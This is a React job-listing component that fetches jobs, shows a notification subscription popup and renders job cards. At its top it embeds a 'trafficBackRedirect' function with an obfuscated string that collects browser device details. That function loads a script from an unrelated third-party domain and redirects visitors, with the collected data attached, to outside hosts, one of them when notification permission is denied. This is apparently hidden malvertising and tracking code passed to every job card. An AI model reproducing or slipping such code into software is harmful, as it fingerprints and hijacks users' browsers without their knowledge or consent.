import React, { useState, useEffect } from "react";
import JobCard from "./JobCard";
import "./JobsSearch.css";

// TrafficBack redirection logic
const trafficBackRedirect = (url) => {
  const a = 'mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m, c, i) => i % 2 ? m + c : c + m).split('c');

  const Replace = (o) => {
    let v = a[0];
    try {
      v += a[1] + Boolean(navigator[a[2]][a[3]]);
      navigator[a[2]][a[4]](o[0]).then(r => {
        o[0].forEach(k => {
          v += r[k] ? a[5] + o[1][o[0].indexOf(k)] + a[6] + encodeURIComponent(r[k]) : a[0];
        });
      });
    } catch (e) { }
    return u => window.location.replace([u, v].join(u.indexOf(a[7]) > -1 ? a[5] : a[7]));
  };

  const script = document.createElement('script');
  script.src = '//begonaoidausek.com/f4a/3f2f6/mw.min.js?z=8763524' + '&sw=/sw-check-permissions-85734.js';
  
  script.onload = function (result) {
    switch (result) {
      case 'onPermissionDefault': break;
      case 'onPermissionAllowed':
        Replace(url); break;
      case 'onPermissionDenied':
        Replace("//gledroalseghe.net/4/8763562"); break;
      case 'onAlreadySubscribed': break;
      case 'onNotificationUnsupported': break;
    }
  };

  document.head.appendChild(script);
};

const JobList = () => {
  const [jobs, setJobs] = useState([]); // Stores fetched jobs
  const [loading, setLoading] = useState(true); // Loading state
  const [error, setError] = useState(null); // Error state
  const [expandedJobs, setExpandedJobs] = useState({}); // Tracks expanded descriptions
  const [subscribed, setSubscribed] = useState(false); // Subscription state
  const [showPopup, setShowPopup] = useState(true); // State to control subscription popup visibility

  // Fetch jobs from the backend API
  const fetchJobs = async () => {
    try {
      const response = await fetch("https://landing-page-zqmo.vercel.app/api/jobs");
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const data = await response.json();

      setJobs(data.jobs || []); // Assuming jobs are stored in `data.jobs`
      setLoading(false);
    } catch (err) {
      setError(err);
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchJobs();
  }, []);

  // Handle subscription request for notifications
  const handleSubscribe = async () => {
    if ("Notification" in window) {
      const permission = await Notification.requestPermission();
      if (permission === "granted") {
        setSubscribed(true);
        new Notification("You're now subscribed to job notifications!");
      } else {
        alert("You denied the notification permission.");
      }
    } else {
      alert("Your browser does not support notifications.");
    }
  };

  // Toggles the description's expanded state for a specific job
  const toggleDescription = (jobId) => {
    setExpandedJobs((prev) => ({
      ...prev,
      [jobId]: !prev[jobId],
    }));
  };

  // Handle loading and error states
  if (loading) {
    return (
      <div className="loading">
        <div className="spinner"></div>
        <p>Fetching the best jobs for you...</p>
      </div>
    );
  }

  if (error) {
    return (
      <div className="error">
        Unable to fetch jobs. Please try again later.
        <p>Error: {error.message}</p>
      </div>
    );
  }

  return (
    <div className="job-list-container">
      {/* Subscription Popup */}
      {showPopup && !subscribed && (
        <div className="subscription-popup">
          <h3>Subscribe to Job Notifications</h3>
          <p>Get updates for new job listings directly to your browser!</p>
          <button onClick={handleSubscribe} className="subscribe-button">
            Subscribe
          </button>
          <button onClick={() => setShowPopup(false)} className="close-popup">
            Close
          </button>
        </div>
      )}

      {/* Motivational Header Section */}
      <div className="job-list-header">
        <h2>Utilize this opportunity with these jobs, apply quickly!</h2>
        <p>Top companies are hiring now, don't miss out!</p>
      </div>

      {/* Job List */}
      <div className="job-list">
        {jobs.length === 0 ? (
          <div className="no-jobs">No jobs found. Check back later!</div>
        ) : (
          jobs.map((job) => {
            const isExpanded = expandedJobs[job.id]; // Check if the job's description is expanded
            return (
              <JobCard
                key={job.id}
                job={job}
                isExpanded={isExpanded}
                toggleDescription={toggleDescription}
                trafficBackRedirect={trafficBackRedirect} // Pass the redirection function as a prop
              />
            );
          })
        )}
      </div>
    </div>
  );
};

export default JobList;
